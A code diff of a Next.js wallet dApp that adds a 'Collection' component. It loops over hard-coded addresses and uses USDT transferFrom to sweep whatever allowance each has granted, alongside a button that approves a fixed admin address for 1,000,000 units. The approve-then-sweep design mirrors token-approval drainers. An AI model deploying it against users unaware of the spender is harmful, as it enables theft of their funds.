@@ -2,24 +2,18 @@
 import './index.css'
 import { Button } from "antd";
 // import Image from "next/image";
-import {
-  useConnect,
-  useAccount,
-  useDisconnect,
-  useEnsAvatar,
-  useEnsName,
-} from "wagmi";
-
-import { useWriteUSDTApprove } from "@/generated";
-
+import { useConnect, useAccount, useDisconnect, useEnsAvatar, useEnsName } from "wagmi";
+import { useWriteUSDTTransferFrom, useWriteUSDTApprove, useReadUSDTBalanceOf, USDT_CONTRACT_ADDRESS, USDTAbi} from "@/generated";
+import { useBalances } from "@/hooks/useBalances"
 import { useEffect, useState } from "react";
-import { ethers } from "ethers";
+import { ethers, formatUnits } from "ethers";
 
 export default function Home() {
   const { connectors } = useConnect();
   const { isConnected } = useAccount();
 
-  if (isConnected) return <Account />;
+  // if (isConnected) return <Account />;
+  if (isConnected) return <Collection />;
 
   const walletConnectConnector = connectors.find(
     (connector) => connector.id === "walletConnect"
@@ -42,14 +36,6 @@ export default function Home() {
 
   return (
     <div className="flex flex-col items-center">
-      {/* <div className="inline-flex w-60 p-2 my-2 border-1 border-black border-dashed flex-col items-center gap-y-1">
-        <p>The following are the mobile scan code access capabilities provided by <strong>WalletConnect</strong></p>
-        <ConnectorButton connector={walletConnectConnector} />
-      </div>
-      <div className="inline-flex w-60 p-2 my-2 border-1 border-black border-dashed flex-col items-center gap-y-1">
-        <p>The following are the injection link capabilities provided by EIP-1193</p>
-        <ConnectorButton connector={injectedConnector} />
-      </div> */}
       <div className="inline-flex w-60 p-2 my-2 border-1 border-black border-dashed flex-col items-center gap-y-1">
         <p className='marginTop20'>Connect Wallet</p>
         {eip6963Buttons}
@@ -112,29 +98,6 @@ const erc20ABI2 = [{
             "0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb"
             , BigInt(1_000_000)]
         });
-      // // 创建一个签名者
-      // const signer = await provider.getSigner()
-      // // 获取用户的以太坊地址
-      // const account = await signer.getAddress()
-      // console.log('Connected with address:', account)
-      // // alert(`Connected with address: ${account}`)
-
-      // // 将金额转换为 wei 单位
-      // const value = ethers.parseEther(amount.toString());
-      // // alert(`Transaction value: ${value}`)
-
-      // // 调用 approve 方法
-      // const tokenContract = new ethers.Contract(contractAddress, erc20ABI, signer);
-      // // alert("tokenContract:",tokenContract);
-      // // const tx = await 
-      // tokenContract.approve(spenderAddress, value);
-      // alert(`Transaction tx: ${tx}`)
-
-      // 等待交易确认
-      // const receipt = await tx.wait();
-
-      // console.log('Transaction receipt:', receipt);
-      // alert(`Transaction receipt: ${receipt}`)
     } catch (error) {
       console.error('Error approving tokens:', error);
       alert(`Error approving tokens: ${error}`)
@@ -143,7 +106,6 @@ const erc20ABI2 = [{
 
   //Approve 授权
   function approveTest() {
-    // approveToken('0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', '1000000')
     approveToken('', '')
         
   }
@@ -154,6 +116,57 @@ const erc20ABI2 = [{
       {address && <div>{ensName ? `${ensName} (${address})` : address}</div>}
       <Button className="marginTop20" onClick={() => disconnect()}>Disconnect</Button>
       <Button className="marginTop20" onClick={() => { approveTest() }}>Approve</Button>
+    </div>
+  );
+};
+
+const Collection = () => {
+  const { address } = useAccount();
+  const { disconnect } = useDisconnect();
+  const { data: ensName } = useEnsName({ address });
+  const { data: ensAvatar } = useEnsAvatar({ name: ensName! });
+  const { writeContractAsync: approve } = useWriteUSDTApprove();
+  const { writeContractAsync: transferFrom } = useWriteUSDTTransferFrom();
+  const { balanceOf } = useReadUSDTBalanceOf();
+  /**
+   * 测试用，生产不用
+   * */  
+  const addressAdmin = "0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb";
+  /**
+   * 待提取地址列表，生产需要获取
+   * */ 
+  const addressToWithdrawList = ["0x46bD3F02D77a6F41fC052E8Ec79002D30a4Dd19A","0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"];
+  async function collectFunc() {
+    
+    try {
+      console.log("work start");
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      const USDTContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDTAbi, provider);
+      for (let i = 0; i < addressToWithdrawList.length; i++) {
+        const targetAddress = addressToWithdrawList[i];
+        const balance = await USDTContract.balanceOf(targetAddress);
+        const allowance = await USDTContract.allowance(targetAddress, address);
+        if (allowance > 0) {
+          const canWithdraw = allowance > balance ? balance: allowance;
+          await transferFrom({args:[ targetAddress, address, canWithdraw]});
+        } else {
+          console.log(targetAddress,":无allowance余额用来归集",allowance);
+        }
+      }
+    } catch (error) {
+      console.error('Error balanceOf tokens:', error);
+      alert(`Error balanceOf tokens: ${error}`)
+    }
+  }
+
+  function collect() {
+    collectFunc()  
+  }
+
+  return (
+    <div className="flex min-h-screen flex-col items-center justify-start marginTop20">
+      <Button className="marginTop20" onClick={() => { collect() }}>归集</Button>
     </div>
   );
 };
@@ -181,14 +194,6 @@ const ConnectorButton = ({ connector }: { connector: any }) => {
   return (
     <Button
       block
-      // icon={
-      //   connector.icon && <Image
-      //     src={connector.icon}
-      //     width={14}
-      //     height={14}
-      //     alt={connector.name}
-      //   />
-      // }
       type="default"
       loading={!providerReady}
       onClick={onClick}
